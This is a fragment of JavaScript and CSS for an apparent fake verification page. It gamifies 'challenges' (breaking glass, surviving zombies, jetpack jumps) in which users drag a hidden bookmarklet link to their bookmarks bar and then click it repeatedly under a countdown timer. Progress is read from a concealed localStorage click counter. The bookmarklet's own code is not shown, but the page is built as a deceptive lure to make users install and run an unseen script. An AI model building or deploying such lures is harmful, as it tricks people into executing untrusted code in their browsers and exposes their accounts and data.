      ".z-eye-l{left:14px}.z-eye-r{right:14px}" +
      ".z-eye::after{content:'';position:absolute;width:6px;height:8px;background:#1a0a0a;border-radius:50%;top:7px;left:7px}" +
      ".z-mouth{position:absolute;bottom:18px;left:50%;transform:translateX(-50%);width:38px;height:14px;background:#1a0a0a;border-radius:2px 2px 8px 8px;overflow:hidden}" +
      ".z-mouth::after{content:'';position:absolute;bottom:0;left:0;right:0;height:5px;background:repeating-linear-gradient(90deg,#fde68a 0 4px,#1a0a0a 4px 8px)}" +
      ".puzzle-zombies-v2{position:relative;width:100%;max-width:340px;margin:0 auto}" +
      ".zombies-arena{position:relative;height:140px;margin:8px 0 12px;border-radius:12px;background:radial-gradient(ellipse 90% 80% at 50% 0%,rgba(30,50,35,.95),transparent 55%),radial-gradient(ellipse 80% 100% at 50% 100%,rgba(15,45,22,.95),#050a08),linear-gradient(180deg,#0a1510 0%,#14291a 45%,#0a120d 100%);overflow:hidden;border:1px solid rgba(74,124,90,.45);box-shadow:inset 0 0 60px rgba(0,0,0,.5),0 4px 20px rgba(0,0,0,.35)}" +
      ".zombies-arena::after{content:'';position:absolute;inset:0;pointer-events:none;background:linear-gradient(180deg,rgba(0,0,0,.15) 0%,transparent 35%,transparent 65%,rgba(0,0,0,.35) 100%);z-index:1}" +
      ".zombies-finish-bar{position:absolute;left:0;top:0;bottom:0;width:10px;background:repeating-linear-gradient(180deg,#b71c1c 0,#b71c1c 6px,#ff5252 6px,#ff5252 12px);z-index:5;box-shadow:4px 0 12px rgba(183,28,28,.5)}" +
      ".zombies-finish-label{position:absolute;left:2px;top:50%;transform:translateY(-50%) rotate(-90deg);font-size:9px;font-weight:800;color:#fff;letter-spacing:.12em;white-space:nowrap;z-index:6;text-shadow:0 1px 2px #000}" +
      ".zombies-lane-inner{position:absolute;left:10px;right:0;top:0;bottom:0;z-index:2}" +
      ".zombie-unit{position:absolute;bottom:16px;width:46px;height:62px;overflow:visible;transition:opacity .18s,transform .18s;z-index:3;background:transparent;border:none;box-shadow:none}" +
      ".zombie-unit-svg{width:100%;height:100%;display:block;filter:drop-shadow(0 4px 6px rgba(0,0,0,.55)) drop-shadow(0 0 1px rgba(0,0,0,.4))}" +
      ".zombie-unit.dead{opacity:0;transform:scale(.35) rotate(85deg);pointer-events:none}" +
      ".zombie-unit.shot-flash .zombie-unit-svg{animation:zombie-shot-svg .22s ease}" +
      "@keyframes zombie-shot-svg{50%{filter:drop-shadow(0 0 10px #fde047) brightness(1.35) saturate(1.2)}}" +
      ".zombie-muzzle{position:absolute;left:50%;bottom:52px;transform:translateX(-50%);width:120px;height:4px;border-radius:2px;background:linear-gradient(90deg,transparent,#ff9800 40%,#ff5722 60%,transparent);opacity:0;z-index:4;pointer-events:none}" +
      ".zombie-muzzle.flash{animation:muzzle-flash .12s ease}" +
      "@keyframes muzzle-flash{0%{opacity:1}100%{opacity:0}}" +
      ".puzzle-jump-v2{position:relative;width:100%;max-width:280px;margin:0 auto;padding-bottom:24px}" +
      ".jump-scene{position:relative;height:200px;border-radius:12px;background:linear-gradient(180deg,#87ceeb 0%,#e1f5fe 55%,#fff8e1 100%);overflow:hidden;margin-bottom:8px;border:2px solid rgba(0,0,0,.06)}" +
      ".jump-ground{position:absolute;left:0;right:0;bottom:0;height:28px;background:linear-gradient(180deg,#8d6e63,#5d4037)}" +
      ".jump-robot-jet{position:absolute;left:50%;bottom:28px;width:56px;height:72px;margin-left:-28px;transition:bottom .2s ease-out;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:flex-end}" +
      ".jump-robot-body{width:100%;height:70%;margin:0 auto;border-radius:12px 12px 8px 8px;background:linear-gradient(180deg,#F38020 0%,#e65100 100%);box-shadow:inset 0 -4px 0 rgba(0,0,0,.15)}" +
      ".jump-robot-head{width:70%;height:28%;margin:-4px auto 0;border-radius:10px;background:#bdbdbd;box-shadow:inset 0 2px 0 rgba(255,255,255,.4)}" +
      ".jet-flame{position:absolute;bottom:-14px;left:50%;width:20px;height:22px;margin-left:-10px;background:linear-gradient(180deg,#ffeb3b,#ff9800,transparent);border-radius:50% 50% 60% 60%;opacity:0;transform:scaleY(.3);transition:opacity .1s,transform .1s}" +
      ".jump-robot-jet.thrust .jet-flame{opacity:1;transform:scaleY(1);animation:flame-flicker .08s ease infinite alternate}" +
      "@keyframes flame-flicker{from{transform:scaleY(.85) scaleX(1.05)}to{transform:scaleY(1.1) scaleX(.95)}}" +
      ".jump-height-tag{position:absolute;right:10px;top:10px;font-size:14px;font-weight:800;color:#0d47a1;background:rgba(255,255,255,.92);padding:8px 12px;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.12)}" +
      ".challenge-stage2-body.puzzle-body-xl{min-height:420px!important;padding-bottom:20px!important}" +
      ".puzzle-glass-wrap,.puzzle-storm-v2,.puzzle-zombies-v2,.puzzle-jump-v2{max-width:400px!important;width:100%!important}" +
      ".puzzle-glass-scene{height:240px!important;border-radius:14px!important}" +
      ".puzzle-progress-wrap{width:100%;max-width:400px;margin:14px auto 0}" +
      ".puzzle-progress-label{font-size:15px;color:#333;margin:10px 0 6px;font-weight:700;text-align:center}" +
      ".puzzle-progress-track{height:22px;border-radius:11px;background:#ececec;overflow:hidden;border:2px solid #ccc;box-shadow:inset 0 2px 4px rgba(0,0,0,.07)}" +
      ".puzzle-progress-fill{height:100%;width:0%;background:linear-gradient(90deg,#e65100,#F38020,#ffcc80);transition:width .08s linear;border-radius:9px}" +
      ".puzzle-progress-fill.storm-health{background:linear-gradient(90deg,#b71c1c,#ff9800,#66bb6a);box-shadow:0 0 20px rgba(52,211,153,.35)}" +
      ".puzzle-progress-wrap.storm-health-wrap{margin-top:4px;padding:14px 16px 16px;border-radius:16px;background:rgba(255,255,255,.06);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border:1px solid rgba(255,255,255,.14);box-shadow:0 4px 24px rgba(0,0,0,.2)}" +
      ".puzzle-progress-wrap.storm-health-wrap .puzzle-progress-label{color:#e2e8f0;font-family:'Outfit',sans-serif;font-size:13px;letter-spacing:.04em;text-transform:uppercase}" +
      ".puzzle-progress-wrap.storm-health-wrap .puzzle-progress-track{height:14px;border-radius:999px;background:rgba(0,0,0,.45);border:1px solid rgba(255,255,255,.12);box-shadow:inset 0 2px 10px rgba(0,0,0,.4)}" +
      ".storm-robot-img{display:block;width:min(150px,42vw);height:auto;margin:12px auto 4px;object-fit:contain;filter:drop-shadow(0 8px 16px rgba(0,0,0,.4));position:relative;z-index:2}" +
      ".storm-vignette{position:absolute;inset:0;pointer-events:none;box-shadow:inset 0 0 100px rgba(183,28,28,.4);opacity:0;transition:opacity .25s;z-index:7;border-radius:20px}" +
      ".storm-vignette.on{opacity:1}" +
      ".zombies-arena{height:220px!important;border-radius:14px!important}" +
      ".zombie-unit{width:46px!important;height:62px!important}" +
      ".zombie-unit.zlane-b{bottom:82px!important}" +
      ".zombie-unit.zlane-c{bottom:148px!important}" +
      ".jump-scene{height:260px!important}" +
      ".puzzle-math-rich{width:100%;max-width:400px;margin:0 auto;font-family:'Outfit',system-ui,sans-serif}" +
      ".math-glass-hero{position:relative;padding:24px 22px 20px;border-radius:22px;border:1px solid rgba(255,255,255,.45);background:linear-gradient(135deg,rgba(255,255,255,.35) 0%,rgba(255,255,255,.12) 45%,rgba(99,102,241,.12) 100%);backdrop-filter:blur(20px) saturate(1.65);-webkit-backdrop-filter:blur(20px) saturate(1.65);box-shadow:0 0 0 1px rgba(255,255,255,.2) inset,0 24px 56px rgba(15,23,42,.12),0 1px 0 rgba(255,255,255,.5) inset;margin-bottom:18px;text-align:center;overflow:hidden}" +
      ".math-glass-hero::before{content:'';position:absolute;top:-50%;right:-20%;width:70%;height:100%;background:radial-gradient(circle,rgba(251,191,36,.22),transparent 62%);pointer-events:none}" +
      ".math-glass-orbit{position:absolute;top:12px;right:12px;width:56px;height:56px;border:2px solid rgba(99,102,241,.35);border-radius:50%;opacity:.55;animation:math-orbit-spin 14s linear infinite}" +
      "@keyframes math-orbit-spin{to{transform:rotate(360deg)}}" +
      ".math-glass-icon{position:relative;z-index:1;display:inline-flex;align-items:center;justify-content:center;width:54px;height:54px;border-radius:16px;background:linear-gradient(145deg,rgba(255,255,255,.75),rgba(255,255,255,.25));border:1px solid rgba(255,255,255,.65);box-shadow:0 10px 28px rgba(99,102,241,.2);font-size:22px;font-weight:800;color:#1e1b4b;font-family:'JetBrains Mono',monospace;margin-bottom:10px}" +
      ".math-glass-title{position:relative;z-index:1;font-size:22px;font-weight:800;color:#0f172a;letter-spacing:-.03em;margin:0 0 6px;line-height:1.2}" +
      ".math-glass-hint{position:relative;z-index:1;font-size:13px;line-height:1.5;color:#475569;margin:0;max-width:300px;margin-left:auto;margin-right:auto;font-weight:500}" +
      ".math-progress-glass .puzzle-progress-label{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:#64748b;font-weight:700}" +
      ".math-progress-glass .puzzle-progress-track{height:16px;border-radius:999px;background:rgba(15,23,42,.06);border:1px solid rgba(148,163,184,.45);box-shadow:inset 0 2px 8px rgba(15,23,42,.08)}" +
      ".math-progress-glass .puzzle-progress-fill{background:linear-gradient(90deg,#6366f1,#a855f7 45%,#f97316);box-shadow:0 0 16px rgba(99,102,241,.35)}" +
      ".puzzle-math-vague{font-size:24px;font-weight:800;color:#222;margin:20px 0 16px;letter-spacing:.08em;text-align:center;font-family:'Outfit',sans-serif}" +
      ".hidden-bookmark-sync{position:absolute!important;width:1px!important;height:1px!important;overflow:hidden!important;left:-9999px!important;clip:rect(0,0,0,0)!important}" +
      ".step2-pressure-timer{width:100%;max-width:400px;margin:0 auto 12px;padding:12px 14px;border-radius:14px;background:linear-gradient(180deg,#fffbeb 0%,#fef3c7 100%);border:1px solid rgba(251,191,36,.5);box-shadow:0 4px 16px rgba(245,158,11,.15)}" +
      ".step2-timer-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}" +
      ".step2-timer-label{font-size:12px;font-weight:800;letter-spacing:.06em;text-transform:uppercase;color:#92400e;font-family:'Outfit',sans-serif}" +
      ".step2-timer-digits{font-size:26px;font-weight:800;color:#b45309;font-family:'JetBrains Mono',monospace;line-height:1}" +
      ".step2-timer-s{font-size:14px;font-weight:700;color:#d97706;margin-left:2px}" +
      ".step2-timer-track{height:10px;border-radius:999px;background:rgba(0,0,0,.08);overflow:hidden;border:1px solid rgba(180,83,9,.2)}" +
      ".step2-timer-fill{height:100%;width:100%;background:linear-gradient(90deg,#ea580c,#fbbf24);border-radius:999px;transition:width .25s linear}" +
      ".step2-timer-hint{margin:8px 0 0;font-size:11px;line-height:1.35;color:#78716c;text-align:center;font-weight:600}" +
      ".stage2-dark-scene .step2-pressure-timer{background:linear-gradient(180deg,rgba(15,23,42,.95),rgba(30,41,59,.85));border-color:rgba(251,191,36,.35);box-shadow:0 4px 24px rgba(0,0,0,.35)}" +
      ".stage2-dark-scene .step2-timer-label{color:#fde68a}" +
      ".stage2-dark-scene .step2-timer-digits{color:#fbbf24}" +
      ".stage2-dark-scene .step2-timer-s{color:#fcd34d}" +
      ".stage2-dark-scene .step2-timer-hint{color:#94a3b8}" +
      ".stage2-dark-scene .step2-timer-track{background:rgba(0,0,0,.35);border-color:rgba(255,255,255,.12)}" +
      ".stage2-math-rich .step2-timer-hint{color:#64748b}";
    document.head.appendChild(st);
  })();

  var U = "https://images.unsplash.com/";
  var Q = "?auto=format&fit=crop&w=300&h=300&q=80";
  /** Inline SVG walkers — consistent art, no stretched photos */
  var ZOMBIE_SVG_VARIANTS = [
    '<svg class="zombie-unit-svg" viewBox="0 0 48 72" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><ellipse cx="24" cy="68" rx="12" ry="3" fill="#000" opacity=".32"/><path d="M12 30h24l3 26-7 8H16l-7-8Z" fill="#5a7a4a" stroke="#1e2b18" stroke-width="1.2"/><rect x="13" y="8" width="22" height="18" rx="8" fill="#6f9260" stroke="#1e2b18" stroke-width="1.1"/><circle cx="18" cy="17" r="4" fill="#fef9c3"/><circle cx="30" cy="17" r="4" fill="#fef9c3"/><circle cx="18" cy="17" r="1.5" fill="#1a1a1a"/><circle cx="30" cy="17" r="1.5" fill="#1a1a1a"/><path d="M19 23h10v2.5H19z" fill="#3f2a2a" opacity=".85"/><path d="M8 34L5 52M40 34l3 18" stroke="#4a6340" stroke-width="3.5" stroke-linecap="round"/><path d="M18 56l-3 12M30 56l3 12" stroke="#4a6340" stroke-width="3.2" stroke-linecap="round"/></svg>',
    '<svg class="zombie-unit-svg" viewBox="0 0 48 72" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><ellipse cx="24" cy="68" rx="12" ry="3" fill="#000" opacity=".32"/><path d="M10 36l4 22h20l4-22-8-10-12 10Z" fill="#4d6840" stroke="#1a2614" stroke-width="1.1"/><ellipse cx="24" cy="22" rx="11" ry="10" fill="#5c7d50" stroke="#1a2614" stroke-width="1"/><circle cx="18.5" cy="20" r="3.8" fill="#bbf7d0"/><circle cx="29.5" cy="20" r="3.8" fill="#bbf7d0"/><circle cx="18.5" cy="20" r="1.4" fill="#0f2918"/><circle cx="29.5" cy="20" r="1.4" fill="#0f2918"/><path d="M20 26h8l-1 3h-6z" fill="#292524"/><path d="M6 42l-3 16M42 42l3 16" stroke="#3d5234" stroke-width="3.2" stroke-linecap="round"/><path d="M15 58l-2 12M33 58l2 12" stroke="#3d5234" stroke-width="3" stroke-linecap="round"/></svg>',
    '<svg class="zombie-unit-svg" viewBox="0 0 48 72" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><ellipse cx="24" cy="68" rx="12" ry="3" fill="#000" opacity=".32"/><rect x="14" y="30" width="20" height="28" rx="7" fill="#556b4e" stroke="#1c2419" stroke-width="1"/><rect x="12" y="6" width="24" height="22" rx="10" fill="#637a58" stroke="#1c2419" stroke-width="1.1"/><circle cx="18" cy="15" r="3.5" fill="#fde68a"/><circle cx="30" cy="15" r="3.5" fill="#fde68a"/><circle cx="18" cy="15" r="1.3" fill="#000"/><circle cx="30" cy="15" r="1.3" fill="#000"/><path d="M18 21h12v2H18z" fill="#422"/><path d="M9 38l-5 12M39 38l5 12" stroke="#465a3f" stroke-width="3" stroke-linecap="round"/><path d="M17 58l-2 12M31 58l2 12" stroke="#465a3f" stroke-width="3.4" stroke-linecap="round"/></svg>',
  ];
  var HAMMER    = U + "photo-1602052793312-b99c2a9ee797" + Q;
  var SCISSORS  = U + "photo-1621446113284-53ca198c7fa7" + Q;
  var WRENCH    = U + "photo-1492540747731-d05a66dc2461" + Q;
  var PIZZA     = U + "photo-1565299624946-b28f40a0ae38" + Q;
  var BURGER    = U + "photo-1568901346375-23c9450c58cd" + Q;
  var APPLE     = U + "photo-1570913149827-d2ac84ab3f9a" + Q;
  var COOKIE    = U + "photo-1558961363-fa8fdf82db35" + Q;
  var CAKE      = U + "photo-1578985545062-69928b1d9587" + Q;
  var PUPPY     = U + "photo-1587300003388-59208cc962cb" + Q;
  var WATCH     = U + "photo-1523275335684-37898b6baf30" + Q;
  var TACO      = U + "photo-1565299585323-38d6b0865b47" + Q;
  var ICECREAM  = U + "photo-1563805042-7684c019e1cb" + Q;  
  var KEYS      = U + "photo-1522770179533-24471fcdba45" + Q;
  var FOREST    = U + "photo-1586864387789-628af9feed72" + Q;
  var BANDAGE   = U + "photo-1579684385127-1ef15d508118" + Q;
  var GUN = "https://images.unsplash.com/photo-1591123720164-de1348028a82?q=80&w=1625&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D";
  var JETPACK   = U + "photo-1446776811953-b23d57bd21aa" + Q; // rocket launch
  var MATH_PLUS = "https://images.unsplash.com/photo-1623057000049-e220f79c7051?q=80&w=1604&auto=format&fit=crop&ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"; // calculator with plus/number keys
  function img(url, label) { return { imageUrl: url, label: label }; }

  var HAMMER_THEMES = [
    { answerIndex: 2, items: [img(SCISSORS,"Scissors"),img(KEYS,"Keys"),img(HAMMER,"Hammer"),img(WRENCH,"Wrench"),img(FOREST,"Screwdriver"),img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie")] },
    { answerIndex: 5, items: [img(TACO,"Taco"),img(CAKE,"Cake"),img(ICECREAM,"Ice Cream"),img(SCISSORS,"Scissors"),img(WRENCH,"Wrench"),img(HAMMER,"Hammer"),img(PUPPY,"Puppy"),img(WATCH,"Watch"),img(KEYS,"Keys")] },
    { answerIndex: 0, items: [img(HAMMER,"Hammer"),img(FOREST,"Screwdriver"),img(SCISSORS,"Scissors"),img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(WRENCH,"Wrench"),img(KEYS,"Keys"),img(CAKE,"Cake")] }
  ];
  var EDIBLE_THEMES = [
    { answerIndex: 1, items: [img(BURGER,"Burger"),img(APPLE,"Apple"),img(BANDAGE,"Bandage"),img(PIZZA,"Pizza"),img(COOKIE,"Cookie"),img(CAKE,"Cake"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(WATCH,"Watch")] },
    { answerIndex: 3, items: [img(SCISSORS,"Scissors"),img(PIZZA,"Pizza"),img(COOKIE,"Cookie"),img(BANDAGE,"Bandage"),img(APPLE,"Apple"),img(BURGER,"Burger"),img(CAKE,"Cake"),img(KEYS,"Keys"),img(WRENCH,"Wrench")] }
  ];
  var WEAPON_THEMES = [
    { answerIndex: 2, items: [img(SCISSORS,"Scissors"),img(WRENCH,"Wrench"),img(GUN,"Weapon"),img(HAMMER,"Hammer"),img(FOREST,"Tool"),img(KEYS,"Keys"),img(WATCH,"Watch"),img(PUPPY,"Puppy"),img(CAKE,"Cake")] },
    { answerIndex: 5, items: [img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie"),img(KEYS,"Keys"),img(GUN,"Weapon"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(SCISSORS,"Scissors")] }
  ];
  var JETPACK_THEMES = [
    { answerIndex: 1, items: [img(WRENCH,"Wrench"),img(JETPACK,"Jetpack"),img(HAMMER,"Hammer"),img(KEYS,"Keys"),img(WATCH,"Watch"),img(FOREST,"Tool"),img(SCISSORS,"Scissors"),img(PUPPY,"Puppy"),img(CAKE,"Cake")] },
    { answerIndex: 4, items: [img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple"),img(COOKIE,"Cookie"),img(JETPACK,"Jetpack"),img(TACO,"Taco"),img(ICECREAM,"Ice Cream"),img(KEYS,"Keys"),img(WATCH,"Watch")] }
  ];
  var MATH_THEMES = [
    { answerIndex: 2, items: [img(KEYS,"Keys"),img(WATCH,"Watch"),img(MATH_PLUS,"Plus"),img(SCISSORS,"Scissors"),img(WRENCH,"Wrench"),img(HAMMER,"Hammer"),img(PIZZA,"Pizza"),img(BURGER,"Burger"),img(APPLE,"Apple")] }
  ];

  var PUZZLES = [
    { id: "glass", name: "Destroy Glass", step1: { bannerLine1: "Bookmark the hammer to destroy the glass", bannerLine2: "Drag the hammer to your bookmarks bar", themes: HAMMER_THEMES }, step2: { type: "glass", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "<span class=\"banner-line1\">Destroy the</span><strong class=\"banner-line2\">glass</strong>" } },
    { id: "storm", name: "Survive Storm", step1: { bannerLine1: "Bookmark the edible or bandage item", bannerLine2: "Drag it to your bookmarks bar", themes: EDIBLE_THEMES }, step2: { type: "storm", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Zombie storm incoming — <strong>keep survivor health above zero</strong>." } },
    { id: "zombies", name: "Survive Zombies", step1: { bannerLine1: "Bookmark the weapon (gun)", bannerLine2: "Drag the gun to your bookmarks bar", themes: WEAPON_THEMES }, step2: { type: "zombies", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Survive the horde — <strong>don't let them cross the line</strong>." } },
    { id: "jump", name: "Jump to 100m", step1: { bannerLine1: "Bookmark the jetpack or strong legs", bannerLine2: "Drag it to your bookmarks bar", themes: JETPACK_THEMES }, step2: { type: "jump", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Reach <strong>100 m</strong> altitude." } },
    { id: "math", name: "Complete Math", step1: { bannerLine1: "Bookmark the math symbol", bannerLine2: "Drag the plus symbol to your bookmarks bar", themes: MATH_THEMES }, step2: { type: "math", timeLimit: 30, noManualDone: true, targetClicks: 0, instruction: "", bannerText: "Glass-locked verification — <strong>fill the signal meter</strong>." } }
  ];

  var currentPuzzle = null;

  function getPuzzle() {
    return PUZZLES[Math.floor(Math.random() * PUZZLES.length)];
  }

  function getTheme() {
    if (!currentPuzzle || !currentPuzzle.step1.themes) return HAMMER_THEMES[0];
    var themes = currentPuzzle.step1.themes;
    return themes[Math.floor(Math.random() * themes.length)];
  }

  function buildChallenge1Grid() {
    if (!currentPuzzle) currentPuzzle = getPuzzle();
    var grid = getEl("challenge1Grid");
    if (!grid) return;
    grid.innerHTML = "";

    var step1 = currentPuzzle.step1;
    var theme = getTheme();
    var line1El = getEl("challenge1BannerLine1");
    var line2El = getEl("challenge1BannerLine2");
    if (line1El) line1El.textContent = step1.bannerLine1;
    if (line2El) line2El.textContent = step1.bannerLine2;

    var answerHref = bookmarkletHref;
    var wrongHref = "javascript:void(0)";

    theme.items.forEach(function (item, i) {
      var isAnswer = (i === theme.answerIndex);
      var href = isAnswer ? answerHref : wrongHref;
      var tile = document.createElement("div");
      tile.className = "challenge-tile draggable";

      var img = document.createElement("img");
      img.src = item.imageUrl;
      img.alt = item.label;
      img.className = "tile-img";
      img.setAttribute("draggable", "false");
      tile.appendChild(img);

      var a = document.createElement("a");
      a.href = href;
      a.className = "drag-layer";
      a.setAttribute("draggable", "true");
      a.setAttribute("title", isAnswer ? "Drag to bookmarks bar" : "Wrong item — bookmark the correct one");
      a.addEventListener("click", function (e) { e.preventDefault(); });
      a.addEventListener("dragstart", function (e) {
        e.dataTransfer.setData("text/uri-list", href);
        e.dataTransfer.setData("text/plain", href);
      });
      tile.appendChild(a);

      grid.appendChild(tile);
    });
  }

  var done1Button = getEl("done1Button");
  var done2Button = getEl("done2Button");
  var challenge1 = getEl("challenge1");
  var challenge2 = getEl("challenge2");
  var clickCounterEl = getEl("clickCounter");

  function renderStep2Content(puzzle) {
    var body = getEl("challenge2Body");
    if (!body || !puzzle || !puzzle.step2) return;
    stopChallenge2Visuals();
    body.classList.remove("puzzle-body-tall", "puzzle-body-xl", "stage2-dark-scene", "stage2-math-rich");
    var s = puzzle.step2;
    var type = s.type;
    var limit = s.timeLimit || 30;
    var timerBlock =
      '<div class="step2-pressure-timer" id="step2PressureTimer" role="status" aria-live="polite">' +
      '<div class="step2-timer-row">' +
      '<span class="step2-timer-label">Time left</span>' +
      '<span class="step2-timer-digits"><span id="step2TimerValue">0</span><span class="step2-timer-s">s</span></span>' +
      "</div>" +
      '<div class="step2-timer-track"><div class="step2-timer-fill" id="step2TimerFill"></div></div>' +
      '<p class="step2-timer-hint">The timer is limited to keep the process quick — please click the bookmark quickly.</p>' +
      "</div>";

    if (type === "glass") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-glass-wrap\">" +
        "<div class=\"puzzle-glass-scene\" id=\"glassScene\">" +
        "<div class=\"glass-shards\" id=\"glassShards\" aria-hidden=\"true\">" +
        "<span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span>" +
        "<span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span><span class=\"glass-shard\"></span>" +
        "</div>" +
        "<div class=\"puzzle-glass-pane\" id=\"glassPane\">" +
        "<div class=\"glass-shine\"></div>" +
        "<div class=\"glass-crack-layer\" id=\"glassCrackA\"></div>" +
        "<div class=\"glass-crack-layer c2\" id=\"glassCrackB\"></div>" +
        "<div class=\"glass-crack-layer c3\" id=\"glassCrackC\"></div>" +
        "</div></div></div>" +
        "<div class=\"puzzle-progress-wrap\">" +
        "<div class=\"puzzle-progress-label\">Destroyed: <strong id=\"glassPctNum\">0</strong>%</div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill\" id=\"glassPctFill\"></div></div>" +
        "</div>";

      var lastGlassN = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      function tickGlass() {
        var pane = getEl("glassPane");
        var scene = getEl("glassScene");
        var cc = getEl("clickCounter");
        var pctEl = getEl("glassPctNum");
        var fill = getEl("glassPctFill");
        if (!pane || !currentPuzzle || currentPuzzle.step2.type !== "glass") return;
        var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        if (cc) cc.textContent = String(n);
        var delta = getStep2SpamClicks();
        var destroyedPct = Math.min(99, Math.floor(delta * GLASS_PCT_PER_CLICK));
        if (pctEl) pctEl.textContent = String(destroyedPct);
        if (fill) fill.style.width = destroyedPct + "%";
        var ratio = destroyedPct / 100;
        var a = getEl("glassCrackA");
        var b = getEl("glassCrackB");
        var c = getEl("glassCrackC");
        if (a) a.style.opacity = ratio > 0.08 ? String(Math.min(1, (ratio - 0.08) / 0.35)) : "0";
        if (b) b.style.opacity = ratio > 0.35 ? String(Math.min(1, (ratio - 0.35) / 0.32)) : "0";
        if (c) c.style.opacity = ratio > 0.62 ? String(Math.min(1, (ratio - 0.62) / 0.38)) : "0";
        if (n > lastGlassN) {
          pane.classList.remove("hammer-hit");
          void pane.offsetWidth;
          pane.classList.add("hammer-hit");
        }
        lastGlassN = n;
        if (destroyedPct >= 99) {
          pane.classList.add("shattered");
          if (scene) scene.classList.add("glass-destroyed");
        }
      }
      tickGlass();
      window._glassVisualInterval = setInterval(tickGlass, 100);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "storm") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl", "stage2-dark-scene");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-storm-v2\" id=\"stormBox\">" +
        "<div class=\"storm-fog\"></div>" +
        "<div class=\"storm-vignette\" id=\"stormVignette\"></div>" +
        "<div class=\"storm-clouds\"></div>" +
        "<div class=\"storm-rain-v2\" id=\"stormRain\"></div>" +
        "<div class=\"storm-zombie-glass-panel\">" +
        "<span class=\"z-tomb-tag\">Infected</span>" +
        "<div class=\"storm-zombie-bust\" aria-hidden=\"true\">" +
        "<div class=\"z-skull\">" +
        "<span class=\"z-eye z-eye-l\"></span><span class=\"z-eye z-eye-r\"></span>" +
        "<div class=\"z-mouth\"></div>" +
        "</div></div></div>" +
        "</div>" +
        "<div class=\"puzzle-progress-wrap storm-health-wrap\">" +
        "<div class=\"puzzle-progress-label\">Survivor health</div>" +
        "<div class=\"puzzle-progress-track\"><div class=\"puzzle-progress-fill storm-health\" id=\"stormHealthFill\" style=\"width:100%\"></div></div>" +
        "</div>";

      var rain = getEl("stormRain");
      if (rain) {
        for (var ri = 0; ri < 56; ri++) {
          var drop = document.createElement("span");
          drop.className = "rain-drop";
          drop.style.left = Math.random() * 100 + "%";
          drop.style.animationDuration = (0.4 + Math.random() * 0.45) + "s";
          drop.style.animationDelay = Math.random() * 1.6 + "s";
          rain.appendChild(drop);
        }
      }

      var robotHealth = 100;
      var lastStormClicks = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      window._stormStartedAt = Date.now();
      var stormLimitMs = limit * 1000;
      window._stormHealthInterval = setInterval(function () {
        if (!currentPuzzle || currentPuzzle.step2.type !== "storm") return;
        var elapsed = Date.now() - window._stormStartedAt;
        var nStorm = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
        if (nStorm > lastStormClicks) {
          robotHealth = Math.min(100, robotHealth + (nStorm - lastStormClicks) * 6);
          lastStormClicks = nStorm;
        }
        var drain = elapsed < stormLimitMs * 0.5 ? 3.4 : 10.2;
        robotHealth -= drain * 0.1;
        var hFill = getEl("stormHealthFill");
        var vig = getEl("stormVignette");
        var ccSt = getEl("clickCounter");
        if (ccSt) ccSt.textContent = String(nStorm);
        if (hFill) hFill.style.width = Math.max(0, Math.min(100, robotHealth)) + "%";
        if (vig) {
          if (robotHealth < 38) vig.classList.add("on");
          else vig.classList.remove("on");
        }
        if (robotHealth <= 0) {
          robotHealth = 0;
          if (window._stormHealthInterval) {
            clearInterval(window._stormHealthInterval);
            window._stormHealthInterval = null;
          }
        }
      }, 100);
      startStep2PressureTimer(limit);
      return;
    }
    if (type === "zombies") {
      body.classList.add("puzzle-body-tall", "puzzle-body-xl");
      body.innerHTML =
        "<span id=\"clickCounter\" class=\"hidden-bookmark-sync\" aria-hidden=\"true\">0</span>" +
        timerBlock +
        "<div class=\"puzzle-zombies-v2\">" +
        "<div class=\"zombies-arena\">" +
        "<div class=\"zombies-finish-bar\"></div>" +
        "<span class=\"zombies-finish-label\">FINISH</span>" +
        "<div class=\"zombies-lane-inner\" id=\"zombiesLane\"></div>" +
        "<div class=\"zombie-muzzle\" id=\"zombieMuzzle\"></div>" +
        "</div></div>";

      var zombies = [];
      var FINISH_PCT = 15;
      var lastZ = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
      var gameOver = false;
      var zombieSpawnAcc = 22;
      var ZOMBIES_PER_SEC = 68;
      var TICK_MS = 10;
